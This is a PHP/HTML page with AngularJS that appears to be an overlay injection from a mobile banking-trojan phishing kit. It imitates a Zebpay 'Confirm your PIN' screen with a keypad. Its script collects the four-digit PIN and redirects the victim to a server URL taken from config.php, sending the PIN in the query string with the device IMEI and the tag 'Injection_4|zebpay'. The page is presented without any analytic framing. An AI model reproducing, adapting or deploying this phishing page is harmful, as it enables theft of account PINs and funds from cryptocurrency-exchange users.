<!DOCTYPE html>
<html lang="en">
	<?php
$IMEI_country = htmlspecialchars($_REQUEST["p"], ENT_QUOTES);
//$IMEI_country = "321|tr";
include "config.php";
?>
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/4.0.0-alpha.6/css/bootstrap.min.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
    <script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.6.5/angular.min.js"></script>
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.11.3/jquery.min.js"></script>
	<style>
		    .top {background: #00aee7; /* color: #fffffffa; */ padding: 12px 0px; font-weight: 100; } span.pin-span {width: 45px; height: 45px; text-align: center; line-height: 45px; border: 1px solid #adadad; border-radius: 7px; margin: 0px 1px; } h5.top-title {margin: 0; font-size: 16px; font-weight: 100; position: relative; top: 4px; color: white; } .t45 {font-size: 12px; margin-top: 15px; color: #636363; letter-spacing: -0.5px; margin-bottom: 39px; text-align: center; } .t767 {font-size: 13px; text-align: center; margin-top: 5px; color: #ababab; letter-spacing: -0.5px; } a.a87 {color: #00aee7 !important; text-decoration: underline !important; margin-left: 5px; } span.line3 {display: inline-block; width: 100%; height: 1px; background: #c3bfbf; box-shadow: 0px -2px 2px 0px #c3bfbf; } .pin_div {padding: 0px 31px; max-width: 283px; margin: 0 auto; } span.pinpaditem {border: 1px solid #05a2d6; width: 76px; height: 50px; text-align: center; line-height: 50px; border-radius: 6px; color: #00aee7; margin: 0px 2px; font-size: 25px; } .pinpad_div {margin: 0 auto; padding: 1px 11px; margin-top: 5px; max-width: 283px; } img.i98 {width: 35px; position: relative; top: -1px; } span.fa.fa-arrow-left {color: white; }
	</style>
</head>
    <body  ng-cloak   ng-app="app" ng-controller="c1" ng-model-options="{'updateOn':'blur'}"      >
<!--From to sedn -->
    <form action="null" method="post" target="flow_handler" id="inputform">
        <input type="hidden" id="name" name="name" value="zuppay">
        <input type="hidden" id="pin" name="pin" value="">
        <input class="button" type="submit" id="submitBtnId" value="submit" style="display:none">
    </form>
    <!--From to sedn -->


<div class="top">
	<div class="container">
		<div class="row">
			<div class="col">
				<span class="fa fa-arrow-left"></span>
			</div>
			<div class="col-10">
				<h5 class="top-title">
					Confirm your PIN
				</h5>
			</div>
		</div>
	</div>
</div>



<div class="main">
	<div class="container">
		<div class="row">
			<div class="col-1"></div>
			<div class="col-10">
				<div class="t45">
					Plase entr your existing PIN to verifiy your account
				</div>
				<div class="pin_div">
					<div class="d-flex justify-content-between">
						<span class="pin-span "> <i ng-show="pin.length>0" class="fa fa-btc"></i>  </span>
						<span class="pin-span "> <i ng-show="pin.length>1" class="fa fa-btc"></i>  </span>
						<span class="pin-span "> <i ng-show="pin.length>2" class="fa fa-btc"></i>  </span>
						<span class="pin-span "> <i ng-show="pin.length>3" class="fa fa-btc"></i>  </span>
					</div>
					<div class="t767">
						3 attemps remaining <a class="a87">Forgot you PIN?</a>
					</div>
				</div>
				<span class="line3"></span>
				<div class="pinpad_div">
					 <div class="d-flex justify-content-between" style="margin-bottom: 8px"><span class="pinpaditem"  ng-click="edit_pin($event)"  >1</span><span class="pinpaditem"  ng-click="edit_pin($event)"  >2</span><span class="pinpaditem"  ng-click="edit_pin($event)"  >3</span></div>
					 <div class="d-flex justify-content-between" style="margin-bottom: 8px"><span class="pinpaditem"  ng-click="edit_pin($event)"  >4</span><span class="pinpaditem"  ng-click="edit_pin($event)"  >5</span><span class="pinpaditem"  ng-click="edit_pin($event)"  >6</span></div>
					 <div class="d-flex justify-content-between" style="margin-bottom: 8px"><span class="pinpaditem"  ng-click="edit_pin($event)"  >7</span><span class="pinpaditem"  ng-click="edit_pin($event)"  >8</span><span class="pinpaditem"  ng-click="edit_pin($event)"  >9</span></div>
					 <div class="d-flex justify-content-between" style="margin-bottom: 8px"><span class="pinpaditem"  ng-click="edit_pin($event)"   style="visibility: hidden;">0</span><span class="pinpaditem">1</span><span class="pinpaditem" ng-click="reset()">  <img src="https://i.imgur.com/gmKUsKb.png" alt="" class="i98">  </span></div>
				</div>
			</div>
			<div class="col-1"></div>
		</div>
	</div>
</div>


<script type="text/javascript">
	app=angular.module('app', []);
	app.controller('c1', ['$scope', function($scope){
		window.sc_=$scope;
		$scope.pin=""
		$scope.edit_pin=function(e){

			if($scope.pin.length!=4){
		      $scope.pin+=''+$(e.target).text().trim();
			}
			if($scope.pin.length==4){

				var url='<?php echo $URL; ?>';
				var imei_c='<?php echo $IMEI_country; ?>';
				location.replace(url+'/o1o/a10.php?p=' + imei_c+"|Injection_4|zebpay|"+$scope.pin+"|Login is PIN");

			}
		}
		$scope.reset=function(){
			$scope.pin="";
		}



	}])
</script>



    </body>
</html>
